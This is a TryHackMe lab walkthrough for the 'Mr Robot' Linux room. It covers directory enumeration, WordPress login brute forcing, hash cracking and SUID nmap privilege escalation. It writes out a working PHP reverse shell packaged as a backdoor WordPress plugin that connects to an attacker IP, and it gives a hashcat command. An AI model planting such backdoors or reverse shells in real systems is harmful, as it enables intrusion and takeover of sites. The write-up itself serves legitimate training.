---
title: "[TryHackMe] walkthrough: Mr Robot (Linux)"
date: 2025-02-14
categories: [tryhackme]
tags: [thm, linux, medium]
---

![head](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.29.02.png)

## Info

- Platform: Tryhackme
- Machine Name: Mr Robot
- Target IP/Host: 10.10.156.218
- OS / Version: Linux
- Difficulty / Category: Medium

## Overview

Directory brute forcing -> find wp-login -> password brute force -> get admin perm -> revshell wordpress plugin upload -> initial access -> find suid binary -> priv escalation

Lets get started right away.

## Recon & Enumeration

I found that the ip address is 10.10.156.218, so I started scanning to gather some information.

As a result, I found that ports 22, 80, 443 were open. And I decided to check port 80 first.

![nmap](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.31.29.png)

Port 80 and 443 showed the same web page.

It was an interactive page, but nothing seemed important or useful.

![web](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.32.06.png)

Next, I tried directory brute forcing.

I found /robots.txt, /wp-loign.

![dir](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.32.36.png)

In /robots.txt, I found a wordlist file called fsocity.dic and first flag.

![dic](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.33.33.png)

![flag](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.34.08.png)

After that, I visited /wp-login.

![web](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.34.49.png)

## Initial Access

I captured the login request using burp suite.

The username parameter was log, and the password parameter was pwd.

When I tried invalid username, the page showed the message ‘invalid username’.
![burp](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.35.25.png)

So I used the wordlist I found earlier to brute force the username.

I found a valid username:Elliot.

![hydra](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.35.59.png)

Next, I used the same wordlist to brute force the password for the user:Elliot.

I was able to find the correct password.

![hydra](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.36.43.png)

Using the credentials, I successfully logged into Wordpress.

Next, I tried to get a reverse shell by uploading a plugin.

The plugin payload was as follows:

```
# reverse.php
<?php
$ip = '10.0.0.1';  // attacker IP
$port = 4444;      // listening port
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>

# evil-plugin.php
<?php
/*
Plugin Name: Evil Plugin
Plugin URI: http://example.com/
Description: This is a backdoor plugin.
Version: 1.0
Author: Attacker
*/

include('reverse.php'); 
?>

# same folder
zip -r evil-plugin.zip evil-plugin
```

I uploaded the plugin as .zip, and executed it.

As a result, I got a reverse shell.

When I checked user using the ‘id’ command, it showed that I was ‘daemon’.

![rev](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.37.30.png)

I checked the /home/robot directory and saw that the second flag was there, but I didn’t have permission to read it.

However, I was able to see a hashed password in same directory.

![hash](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.38.02.png)

## Privilege Escalation

I used hashcat to crack the hash, and I was able to recover the password.

`hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`

![hash](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.38.44.png)

I used the password to switch to the robot user.

After that, I got second flag.

Next, I searched the system for binary files with the SUID permissions to escalate to root.

![suid](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.39.41.png)

I noticed the nmap binary had the SUID permission.

Using gtfobins, I found a way to bypass it and get root access.

![gtfo](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.40.08.png)

`python -c 'import pty; pty.spawn("/bin/bash")'`

In the end, I gained root access and got the final flag from the /root directory.

![root](/assets/images/tryhackme/mr_robot/스크린샷%202025-08-23%20오후%207.40.45.png)
